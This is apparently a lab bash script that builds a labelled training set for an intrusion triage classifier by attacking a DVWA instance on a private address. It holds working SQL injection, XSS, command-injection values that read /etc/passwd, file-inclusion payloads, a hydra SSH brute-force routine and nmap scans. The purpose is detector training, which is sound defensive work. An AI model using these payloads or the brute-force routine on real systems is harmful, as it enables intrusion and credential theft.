#!/usr/bin/env bash
#
# collect_dataset.sh - collect a LABELLED, INTENSITY-VARIED dataset for the
# CyREN triage classifier, using the same real tools as the other lab scripts
# (hand-crafted curl injection, hydra, nmap). Each short "session" RANDOMISES its
# intensity (request count + per-request delay) so attack and benign request_count
# RANGES OVERLAP (the "grey zone") - forcing the classifier to learn the real
# signal (attack payload present -> has_keyword) instead of "high volume == attack".
#
# THIS IS DATASET COLLECTION, NOT EVASION. Every session is recorded with its TRUE
# label in the manifest, whether or not it trips a detection rule (some low-rate
# attacks trip the rule, some do not - both are recorded). Authorised isolated lab
# only; refuses any public target.
#
# Design (kept from the other scripts):
#   * attack sessions come from an ATTACK IP pool, benign from a BENIGN IP pool;
#     the pool IS the label, so source_ip is only used to LABEL, never a feature.
#   * each session uses a FRESH source IP so CyREN records it as its own event
#     (CyREN aggregates by (source_ip, rule); reusing an IP would merge them).
#
# Usage:
#   sudo IFACE=eth1 TARGET=192.168.56.101 ./collect_dataset.sh --attack 20 --benign 20
#   # quick smoke test (tiny + fast):
#   sudo IFACE=eth1 ATK_REQ_MAX=4 BEN_REQ_MAX=6 DELAY_MS_MAX=300 ./collect_dataset.sh --attack 1 --benign 1 --yes
#
set -uo pipefail

# ----------------------------------------------------------------- config
TARGET="${TARGET:-192.168.56.101}"
IFACE="${IFACE:-eth1}"                     # Kali Host-Only NIC (MUST reach the target)
DVWA_USER="${DVWA_USER:-admin}"
DVWA_PASS="${DVWA_PASS:-password}"

IP_PREFIX="${IP_PREFIX:-192.168.56}"
ATTACK_OCT0="${ATTACK_OCT0:-170}"          # attack sessions -> .170, .171, ...
BENIGN_OCT0="${BENIGN_OCT0:-200}"          # benign sessions -> .200, .201, ...

N_ATTACK="${N_ATTACK:-20}"
N_BENIGN="${N_BENIGN:-20}"

# intensity randomisation (the grey zone: these OVERLAP on purpose)
ATK_REQ_MIN="${ATK_REQ_MIN:-1}";  ATK_REQ_MAX="${ATK_REQ_MAX:-40}"
BEN_REQ_MIN="${BEN_REQ_MIN:-5}";  BEN_REQ_MAX="${BEN_REQ_MAX:-60}"
DELAY_MS_MIN="${DELAY_MS_MIN:-0}"; DELAY_MS_MAX="${DELAY_MS_MAX:-2000}"

# curl timeouts (so a broken route can NEVER hang the whole run)
CT="${CONNECT_TIMEOUT:-5}"                  # connect timeout (s)
MT="${MAX_TIME:-25}"                        # max time per request (s)
CURL_TO=(--connect-timeout "$CT" --max-time "$MT")

MANIFEST="${MANIFEST:-$(cd "$(dirname "$0")" && pwd)/dataset_manifest.csv}"
ASSUME_YES=0

# --------------------------------------------------------------- arg parse
while [ $# -gt 0 ]; do
  case "$1" in
    --attack) N_ATTACK="$2"; shift 2 ;;
    --benign) N_BENIGN="$2"; shift 2 ;;
    --yes)    ASSUME_YES=1; shift ;;
    -h|--help) grep '^#' "$0" | sed 's/^# \{0,1\}//'; exit 0 ;;
    *) echo "unknown arg: $1" >&2; exit 2 ;;
  esac
done

# ------------------------------------------------------------- pretty print
c_ok()   { printf '\033[1;32m[+]\033[0m %s\n' "$*"; }
c_info() { printf '\033[1;34m[*]\033[0m %s\n' "$*"; }
c_warn() { printf '\033[1;33m[!]\033[0m %s\n' "$*"; }
c_err()  { printf '\033[1;31m[x]\033[0m %s\n' "$*" >&2; }

# ------------------------------------------------------------ safety checks
case "$TARGET" in
  10.*|192.168.*|172.1[6-9].*|172.2[0-9].*|172.3[0-1].*) : ;;
  *) c_err "TARGET $TARGET is not a private lab address. Refusing."; exit 1 ;;
esac
[ "$(id -u)" -eq 0 ] || { c_err "run as root (IP aliasing + source routing): sudo $0"; exit 1; }
command -v curl >/dev/null 2>&1 || { c_err "missing tool: curl"; exit 1; }
have() { command -v "$1" >/dev/null 2>&1; }

# ---------------------------------------------- IP-pool range / overlap guard
# Source IPs are IP_PREFIX.(OCT0 + index). A /24 host octet must stay in 1..254
# (256+ is not a valid IP, 255 is broadcast), and the attack and benign pools
# must not overlap (an IP used for BOTH corrupts its label AND reuses an IP the
# firewall already blocked as an attacker). Fail HERE with the real limits,
# instead of mid-run with a flood of ".259 could not set route" / login-failed.
_atk_last=$(( ATTACK_OCT0 + N_ATTACK - 1 ))
_ben_last=$(( BENIGN_OCT0 + N_BENIGN - 1 ))
_bad=0
if [ "$N_ATTACK" -gt 0 ] && { [ "$ATTACK_OCT0" -lt 1 ] || [ "$_atk_last" -gt 254 ]; }; then
  c_err "attack pool ${IP_PREFIX}.${ATTACK_OCT0}..${IP_PREFIX}.${_atk_last} leaves the valid 1..254 range."
  c_err "  with ATTACK_OCT0=${ATTACK_OCT0}, --attack can be at most $(( 255 - ATTACK_OCT0 ))."
  _bad=1
fi
if [ "$N_BENIGN" -gt 0 ] && { [ "$BENIGN_OCT0" -lt 1 ] || [ "$_ben_last" -gt 254 ]; }; then
  c_err "benign pool ${IP_PREFIX}.${BENIGN_OCT0}..${IP_PREFIX}.${_ben_last} leaves the valid 1..254 range."
  c_err "  with BENIGN_OCT0=${BENIGN_OCT0}, --benign can be at most $(( 255 - BENIGN_OCT0 ))."
  _bad=1
fi
if [ "$N_ATTACK" -gt 0 ] && [ "$N_BENIGN" -gt 0 ] \
   && [ "$ATTACK_OCT0" -le "$_ben_last" ] && [ "$BENIGN_OCT0" -le "$_atk_last" ]; then
  c_err "attack pool .${ATTACK_OCT0}..${_atk_last} OVERLAPS benign pool .${BENIGN_OCT0}..${_ben_last}."
  c_err "  the shared IPs get labelled BOTH ways and reuse a blocked attacker IP -> login fails."
  _bad=1
fi
if [ "$_bad" = 1 ]; then
  c_err "fix: keep each pool inside 1..254 and non-overlapping."
  c_err "     with the defaults (attack from .${ATTACK_OCT0}, benign from .${BENIGN_OCT0}) a safe run is:"
  c_err "       ./collect_dataset.sh --attack 30 --benign 50"
  c_err "     for more, move a pool: ATTACK_OCT0=10 BENIGN_OCT0=60 ./collect_dataset.sh --attack 30 --benign 40"
  exit 2
fi

# --------------------------------------------------------------- helpers
rnd()  { echo $(( RANDOM % ($2 - $1 + 1) + $1 )); }
pause() { local ms; ms=$(rnd "$DELAY_MS_MIN" "$DELAY_MS_MAX"); sleep "$(awk "BEGIN{printf \"%.3f\", $ms/1000}")"; }

ALIASES=()
add_src() {                                   # add alias + route target out of it
  local aip="$1"
  ip addr add "$aip/24" dev "$IFACE" 2>/dev/null && ALIASES+=("$aip") || true
  ip route replace "$TARGET" dev "$IFACE" src "$aip" 2>/dev/null \
    || c_warn "  could not set route src $aip on $IFACE"
}
del_src() { ip addr del "$1/24" dev "$IFACE" 2>/dev/null || true; }
cleanup() {
  ip route replace "$TARGET" dev "$IFACE" 2>/dev/null || true
  for a in "${ALIASES[@]:-}"; do ip addr del "$a/24" dev "$IFACE" 2>/dev/null || true; done
}
trap cleanup EXIT

# DVWA login for a cookie jar (all curls time-limited); returns non-zero on failure
dvwa_login() {
  local jar="$1" t
  t="$(curl -s "${CURL_TO[@]}" -c "$jar" "http://$TARGET/dvwa/login.php" | grep -oP "user_token'[^>]*value='\K[0-9a-f]+" | head -1)"
  [ -n "$t" ] || return 1                     # no token => could not reach DVWA
  curl -s "${CURL_TO[@]}" -b "$jar" -c "$jar" -o /dev/null \
    --data "username=$DVWA_USER&password=$DVWA_PASS&Login=Login&user_token=$t" "http://$TARGET/dvwa/login.php"
  t="$(curl -s "${CURL_TO[@]}" -b "$jar" "http://$TARGET/dvwa/security.php" | grep -oP "user_token'[^>]*value='\K[0-9a-f]+" | head -1)"
  curl -s "${CURL_TO[@]}" -b "$jar" -c "$jar" -o /dev/null \
    --data "security=low&seclevel=low&user_token=$t" "http://$TARGET/dvwa/security.php"
  grep -qi PHPSESSID "$jar"
}

# ---- PRE-FLIGHT: fail fast (with guidance) instead of hanging forever --------
preflight() {
  ip link show "$IFACE" >/dev/null 2>&1 || {
    c_err "interface '$IFACE' not found. Set IFACE=<your Host-Only NIC>. List them: ip -br addr"; exit 1; }
  ip -4 addr show "$IFACE" 2>/dev/null | grep -q "inet ${IP_PREFIX//./\\.}\." \
    || c_warn "$IFACE has no ${IP_PREFIX}.x address - is it really your Host-Only NIC? (ip -br addr)"
  local tip="${IP_PREFIX}.${ATTACK_OCT0}" code
  ip addr add "$tip/24" dev "$IFACE" 2>/dev/null || true
  ip route replace "$TARGET" dev "$IFACE" src "$tip" 2>/dev/null || true
  c_info "preflight: reaching http://$TARGET/dvwa/ from $tip via $IFACE (timeout ${CT}s) ..."
  code="$(curl -s -o /dev/null -w '%{http_code}' "${CURL_TO[@]}" "http://$TARGET/dvwa/login.php" 2>/dev/null || echo 000)"
  del_src "$tip"; ip route replace "$TARGET" dev "$IFACE" 2>/dev/null || true
  if [ "$code" = "000" ]; then
    c_err "cannot reach DVWA from $tip via $IFACE (curl timed out / no route)."
    c_err "  fix: is $IFACE your Host-Only NIC? is DVWA up at http://$TARGET/dvwa/ ?"
    c_err "  run 'ip -br addr' on Kali and set IFACE to the 192.168.56.x interface."
    exit 1
  fi
  c_ok "preflight OK (HTTP $code from $tip via $IFACE) - routing works"
}

# ---- payload sets (REAL attack strings) ----
SQLI=("1' UNION SELECT user,password FROM users-- -" "1' OR '1'='1" "1' AND 1=1-- -"
      "1' AND SLEEP(2)-- -" "1' AND extractvalue(1,concat(0x7e,version()))-- -")
XSS=("<script>alert(1)</script>" "<img src=x onerror=alert(1)>" "<svg/onload=alert(1)>" "<body onload=alert(1)>")
CMD=("127.0.0.1;id" "127.0.0.1|whoami" "127.0.0.1&&uname -a" "127.0.0.1;cat /etc/passwd")
FI=("../../../../etc/passwd" "....//....//etc/passwd" "/etc/passwd" "php://filter/read=convert.base64-encode/resource=/etc/passwd")
BASELINE=("dvwa/index.php" "dvwa/about.php" "dvwa/instructions.php" "dvwa/security.php"
          "dvwa/dvwa/css/main.css" "dvwa/dvwa/js/dvwaPage.js" "dvwa/dvwa/images/logo.png")

[ -f "$MANIFEST" ] || echo "timestamp_utc,session_id,label,type,tool,source_ip,planned_requests,delay_range_ms,notes" > "$MANIFEST"
ATTACK_IPS=(); BENIGN_IPS=()
rec() { echo "$(date -u +%FT%TZ),$SID,$1,$2,$3,$4,$5,${DELAY_MS_MIN}-${DELAY_MS_MAX},$6" >> "$MANIFEST"; }

# --------------------------------------------------- session runners (verbose)
web_attack() {   # $1 type  $2 path  $3 param  <payload...>
  local type="$1" path="$2" param="$3"; shift 3
  local arr=("$@") ip jar n i p
  ip="${IP_PREFIX}.$((ATTACK_OCT0 + ${#ATTACK_IPS[@]}))"; ATTACK_IPS+=("$ip")
  c_info "session $SID: attack $type from $ip"
  add_src "$ip"; jar="$(mktemp)"
  c_info "  logging in to DVWA ..."
  if ! dvwa_login "$jar"; then
    c_warn "  login failed (unreachable?) - recorded as login-failed, moving on"
    rm -f "$jar"; rec attack "$type" curl "$ip" 0 "login-failed"; return
  fi
  n=$(rnd "$ATK_REQ_MIN" "$ATK_REQ_MAX")
  c_info "  login ok; sending $n $type requests (delay ${DELAY_MS_MIN}-${DELAY_MS_MAX}ms)"
  for i in $(seq 1 "$n"); do
    p="${arr[$((RANDOM % ${#arr[@]}))]}"
    curl -s "${CURL_TO[@]}" -b "$jar" -o /dev/null -G --data-urlencode "$param=$p" --data "Submit=Submit" \
      "http://$TARGET/dvwa/vulnerabilities/$path/"
    printf '\r    %d/%d' "$i" "$n"; pause
  done
  echo; rm -f "$jar"; rec attack "$type" curl "$ip" "$n" "real payloads, path-based rule"
  c_ok "  session $SID done ($ip, $n requests)"
}

atk_ssh() {
  local ip pl n t; ip="${IP_PREFIX}.$((ATTACK_OCT0 + ${#ATTACK_IPS[@]}))"; ATTACK_IPS+=("$ip")
  c_info "session $SID: attack ssh from $ip"; add_src "$ip"
  if ! have hydra; then rec attack ssh hydra "$ip" 0 "hydra-missing"; c_warn "  hydra missing; skip"; return; fi
  pl="$(mktemp)"; printf '%s\n' 123456 password admin root toor letmein qwerty dvwa password123 P@ssw0rd changeme > "$pl"
  n=$(rnd 1 11); t=$(rnd 1 4); head -n "$n" "$pl" > "${pl}.n"
  c_info "  hydra: $n passwords, t=$t (<5 may not trip threshold)"
  timeout 90 hydra -l sysadmin -P "${pl}.n" -t "$t" -f -o /dev/null "ssh://$TARGET" >/dev/null 2>&1 || true
  rm -f "$pl" "${pl}.n"; rec attack ssh hydra "$ip" "$n" "threshold(>=5); low n may not fire = recorded"
  c_ok "  session $SID done ($ip)"
}

atk_scan() {
  local ip hi rate; ip="${IP_PREFIX}.$((ATTACK_OCT0 + ${#ATTACK_IPS[@]}))"; ATTACK_IPS+=("$ip")
  c_info "session $SID: attack scan from $ip"; add_src "$ip"
  if ! have nmap; then rec attack scan nmap "$ip" 0 "nmap-missing"; c_warn "  nmap missing; skip"; return; fi
  hi=$(rnd 20 1000); rate=$(rnd 50 400)
  c_info "  nmap: ports 1-$hi rate $rate (low may not trip PORTSCAN)"
  timeout 120 nmap -sT -p "1-$hi" --max-rate "$rate" --host-timeout 90s -Pn "$TARGET" >/dev/null 2>&1 || true
  rec attack scan nmap "$ip" "$hi" "iptables PORTSCAN threshold; low may not fire = recorded"
  c_ok "  session $SID done ($ip)"
}

sess_benign() {
  local ip jar n i; ip="${IP_PREFIX}.$((BENIGN_OCT0 + ${#BENIGN_IPS[@]}))"; BENIGN_IPS+=("$ip")
  c_info "session $SID: benign from $ip"; add_src "$ip"; jar="$(mktemp)"
  c_info "  logging in to DVWA ..."
  if ! dvwa_login "$jar"; then
    c_warn "  login failed - recorded as login-failed, moving on"
    rm -f "$jar"; rec benign browse curl "$ip" 0 "login-failed"; return
  fi
  n=$(rnd "$BEN_REQ_MIN" "$BEN_REQ_MAX")
  c_info "  login ok; sending $n benign requests"
  for i in $(seq 1 "$n"); do
    case $((RANDOM % 5)) in
      0) curl -s "${CURL_TO[@]}" -b "$jar" -o /dev/null "http://$TARGET/${BASELINE[$((RANDOM % ${#BASELINE[@]}))]}" ;;
      1) curl -s "${CURL_TO[@]}" -b "$jar" -o /dev/null "http://$TARGET/dvwa/vulnerabilities/sqli/?id=$((RANDOM%3+1))&Submit=Submit" ;;
      2) curl -s "${CURL_TO[@]}" -b "$jar" -o /dev/null -G --data-urlencode "name=John" --data "Submit=Submit" "http://$TARGET/dvwa/vulnerabilities/xss_r/" ;;
      3) curl -s "${CURL_TO[@]}" -b "$jar" -o /dev/null --data-urlencode "ip=127.0.0.1" --data "Submit=Submit" "http://$TARGET/dvwa/vulnerabilities/exec/" ;;
      4) curl -s "${CURL_TO[@]}" -b "$jar" -o /dev/null "http://$TARGET/dvwa/vulnerabilities/fi/?page=include.php" ;;
    esac
    printf '\r    %d/%d' "$i" "$n"; pause
  done
  echo; rm -f "$jar"; rec benign browse curl "$ip" "$n" "legit inputs, no payload"
  c_ok "  session $SID done ($ip, $n requests)"
}

ATK_TYPES=(sqli sqli sqli xss xss cmd cmd fi fi ssh scan)
run_attack() {
  case "${ATK_TYPES[$((RANDOM % ${#ATK_TYPES[@]}))]}" in
    sqli) web_attack sqli sqli   id   "${SQLI[@]}" ;;
    xss)  web_attack xss  xss_r  name "${XSS[@]}"  ;;
    cmd)  web_attack cmd  exec   ip   "${CMD[@]}"  ;;
    fi)   web_attack fi   fi     page "${FI[@]}"   ;;
    ssh)  atk_ssh ;;
    scan) atk_scan ;;
  esac
}

# ------------------------------------------------------------------- run
echo
c_warn "CyREN dataset collector (grey-zone, intensity-varied, LABELLED)"
c_warn "  target $TARGET  iface $IFACE  attack $N_ATTACK  benign $N_BENIGN"
c_warn "  every session is recorded with its TRUE label (data collection, not evasion)"
if [ "$ASSUME_YES" != 1 ]; then
  read -r -p "Generate the labelled dataset against $TARGET? [y/N] " ans
  [ "$ans" = "y" ] || [ "$ans" = "Y" ] || { c_info "aborted."; exit 0; }
fi

preflight    # <-- fails fast with guidance if IFACE/target/routing is wrong

SID=0; a=0; b=0
c_info "running $N_ATTACK attack + $N_BENIGN benign sessions"
while [ "$a" -lt "$N_ATTACK" ] || [ "$b" -lt "$N_BENIGN" ]; do
  SID=$((SID + 1))
  if [ "$b" -ge "$N_BENIGN" ] || { [ "$a" -lt "$N_ATTACK" ] && [ $((RANDOM % 2)) -eq 0 ]; }; then
    run_attack; a=$((a + 1))
  else
    sess_benign; b=$((b + 1))
  fi
done

join() { local IFS=,; echo "$*"; }
echo
c_ok "done. $SID sessions recorded in $MANIFEST"
c_info "attack IPs: $(join "${ATTACK_IPS[@]:-}")"
c_info "benign IPs: $(join "${BENIGN_IPS[@]:-}")"
c_info "label on the CyREN host (copy the manifest over first):"
echo "  python scripts/export_training_set.py --label-manifest $MANIFEST"
